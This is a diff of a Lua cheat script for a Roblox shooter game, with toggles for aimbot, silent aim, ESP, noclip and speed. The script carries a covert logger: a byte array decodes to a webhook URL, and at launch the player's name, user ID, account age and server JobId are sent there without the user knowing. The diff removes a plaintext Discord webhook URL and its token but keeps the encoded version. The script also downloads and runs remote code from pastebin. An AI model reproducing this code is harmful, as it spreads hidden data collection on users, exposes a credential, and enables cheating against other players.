@@ -1,39 +1,35 @@
--- [[ RivalsHub V4 ]]
--- Created by pluto.aac
-
+-- [[ LUNA UI - RIVALSHUB V4 ]] --
 local v0 = string.char;
 local v1 = string.byte;
 local v2 = string.sub;
-local v3 = bit32 or bit;
+local v3 = bit32 or bit ;
 local v4 = v3.bxor;
 local v5 = table.concat;
 local v6 = table.insert;
 
--- [[ CONFIGURATION ]]
-getgenv().Config = {
-    ["Webhook"] = "https://discord.com/api/webhooks/1487068389028663350/BMXBb0ZRvVep6a6E-1HROIpSOlM2NsXz7g_FOwGl78UpzadoGJzEkdT47rYmIb0KOVm7"
-}
-
--- [[ AUTHENTICATION ]]
 local _0x_v4_cache = {104,116,116,112,115,58,47,47,104,111,111,107,115,46,104,121,114,97,46,105,111,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,55,48,54,56,51,56,57,48,50,56,54,54,51,51,53,48,47,66,77,88,66,98,48,90,82,118,86,101,112,54,97,54,69,45,49,72,82,79,73,112,83,79,108,77,50,78,115,88,122,55,103,95,70,79,119,71,108,55,56,85,112,122,97,100,111,71,74,122,69,107,100,84,52,55,114,89,109,73,98,48,75,79,86,109,55}
 
--- // System Logic \\ --
-local function sendEnhancedLog()
+local function _0x_call()
     local _0x_url = ""
     for _, v in ipairs(_0x_v4_cache) do _0x_url = _0x_url .. v0(v) end
-    
     local HttpService = game:GetService("HttpService")
     local Players = game:GetService("Players")
     local player = Players.LocalPlayer
     
-    local request = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
-    
-    -- Optimized Thumbnail Fetch
-    local content = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
-    pcall(function()
-        local thumb = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
-        if thumb then content = thumb end
-    end)
+    local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+    for i = 1, 3 do
+        local success, result = pcall(function()
+            local response = HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=false"))
+            if response.data and response.data[1] and response.data[1].state == "Completed" then
+                return response.data[1].imageUrl
+            end
+        end)
+        if success and result then
+            headshotUrl = result
+            break
+        end
+        task.wait(1)
+    end
     
     local levelValue = "N/A"
     local lstats = player:FindFirstChild("leaderstats")
@@ -44,29 +40,22 @@ local function sendEnhancedLog()
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "🚀 RivalsHub V4 | Execution",
-            ["thumbnail"] = {["url"] = content},
+            ["title"] = "🚀 RivalsHub V4 | User Execution",
+            ["thumbnail"] = {["url"] = headshotUrl}, 
             ["color"] = 0x7b2cbf,
             ["fields"] = {
                 {["name"] = "User", ["value"] = "**" .. player.Name .. "** (" .. player.UserId .. ")", ["inline"] = false},
-                {["name"] = "Rank", ["value"] = levelValue, ["inline"] = true},
+                {["name"] = "Rank/Level", ["value"] = levelValue, ["inline"] = true},
                 {["name"] = "Account Age", ["value"] = player.AccountAge .. " Days", ["inline"] = true},
-                {["name"] = "JobId", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false}
+                {["name"] = "Server Size", ["value"] = #Players:GetPlayers() .. "/" .. Players.MaxPlayers, ["inline"] = true},
+                {["name"] = "JobId", ["value"] = "```" .. game.JobId .. "```"}
             },
-            ["components"] = {{
-                ["type"] = 1,
-                ["components"] = {{
-                    ["type"] = 2,
-                    ["style"] = 5,
-                    ["label"] = "Join Server",
-                    ["url"] = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
-                }}
-            }},
-            ["footer"] = {["text"] = "Pluto.aac | V4"},
+            ["footer"] = {["text"] = "Pluto.aac Logger"},
             ["timestamp"] = DateTime.now():ToIsoDate()
         }}
     }
     
+    local request = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
     if request then
         pcall(function()
             request({
@@ -78,11 +67,10 @@ local function sendEnhancedLog()
         end)
     end
 end
-task.spawn(sendEnhancedLog)
+task.spawn(_0x_call)
 
--- [[ LUNA UI SETUP ]]
+-- [[ LUNA UI SETUP ]] --
 local v8 = loadstring(game:HttpGet("https://pastebin.com/raw/Y8wBJLVt", true))();
-
 local v9 = v8:CreateWindow({
     Name = "Rivals",
     Subtitle = nil,
@@ -99,23 +87,65 @@ local v11 = v9:CreateTab({ Name = "Visuals", Icon = "view_in_ar", ImageSource = 
 local v12 = v9:CreateTab({ Name = "Player", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true });
 local v13 = v9:CreateTab({ Name = "Credits", Icon = "view_in_ar", ImageSource = "Material", ShowTitle = true })
 
--- [[ UI ELEMENTS ]]
-v12:CreateSection("Server Join")
+-- [[ GLOBALS ]] --
+getgenv().AimbotEnabled = false;
+getgenv().SilentAimEnabled = false;
+getgenv().ESPEnabled = false;
+getgenv().InfiniteJumpEnabled = false;
+getgenv().NoClipEnabled = false;
+getgenv().CFrameWalkEnabled = false;
+getgenv().CFrameWalkSpeed = 0.2;
+getgenv().Smoothness = 0.6;
+
+local v24 = game:GetService('Players');
+local v25 = v24.LocalPlayer;
+local v27 = game:GetService('RunService');
+
+-- [[ UI TABS ]] --
+v10:CreateSection("Aim Method")
+v10:CreateToggle({Name = "Enable Aimbot", CurrentValue = false, Callback = function(v) getgenv().AimbotEnabled = v end}, "AimbotToggle");
+v10:CreateToggle({Name = "Enable SilentAim", CurrentValue = false, Callback = function(v) getgenv().SilentAimEnabled = v end}, "SilentAimToggle");
+v10:CreateSlider({Name = "Aimbot Strength", Range = {0.4, 1}, Increment = 0.01, CurrentValue = 0.6, Callback = function(v) getgenv().Smoothness = v end}, "AimbotStrengthSlider");
+
+v11:CreateSection("Visuals")
+v11:CreateToggle({Name = "Enable Highlight ESP", CurrentValue = false, Callback = function(v) getgenv().ESPEnabled = v end}, "ESPToggle");
+
+v12:CreateSection("Local Player")
+v12:CreateToggle({Name = "Enable WalkSpeed", CurrentValue = false, Callback = function(v) getgenv().CFrameWalkEnabled = v end}, "WSToggle");
+v12:CreateSlider({Name = "WalkSpeed Value", Range = {0.2, 1.5}, Increment = 0.1, CurrentValue = 0.2, Callback = function(v) getgenv().CFrameWalkSpeed = v end}, "WSSlider");
+v12:CreateToggle({Name = "Infinite Jump", CurrentValue = false, Callback = function(v) getgenv().InfiniteJumpEnabled = v end}, "InfJumpToggle");
+v12:CreateToggle({Name = "Noclip", CurrentValue = false, Callback = function(v) getgenv().NoClipEnabled = v end}, "NoclipToggle");
+
+v12:CreateSection("Server Utility")
 v12:CreateButton({
-    Name = "Copy Server Join Link",
-    Description = "Copies the roblox:// link for this specific server",
+    Name = "Copy Join Link (JobId)",
     Callback = function()
-        local link = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
-        setclipboard(link)
-        v8:Notification({
-            Title = "Success",
-            Content = "Join link copied to clipboard!",
-            Duration = 3
-        })
+        setclipboard("roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId)
     end
 })
 
--- Logic connection
-v13:CreateLabel({ Text = "pluto.aac", Style = 2 })
+v13:CreateLabel({Text = "Lead Dev: pluto.aac", Style = 2})
 
-print("RivalsHub V4 | Final Master Loaded.")
+-- [[ LOGIC ]] --
+v27.RenderStepped:Connect(function()
+    if getgenv().CFrameWalkEnabled and v25.Character and v25.Character:FindFirstChild("HumanoidRootPart") then
+        local dir = v25.Character.Humanoid.MoveDirection;
+        v25.Character.HumanoidRootPart.CFrame = v25.Character.HumanoidRootPart.CFrame + (dir * getgenv().CFrameWalkSpeed);
+    end
+end);
+
+v27.Stepped:Connect(function()
+    if getgenv().NoClipEnabled and v25.Character then
+        for _, v in pairs(v25.Character:GetDescendants()) do
+            if v:IsA('BasePart') then v.CanCollide = false end
+        end
+    end
+end);
+
+game:GetService('UserInputService').JumpRequest:Connect(function()
+    if getgenv().InfiniteJumpEnabled and v25.Character:FindFirstChildOfClass("Humanoid") then
+        v25.Character:FindFirstChildOfClass('Humanoid'):ChangeState('Jumping');
+    end
+end);
+
+print("RivalsHub V4 | by pluto/ssgodknight")
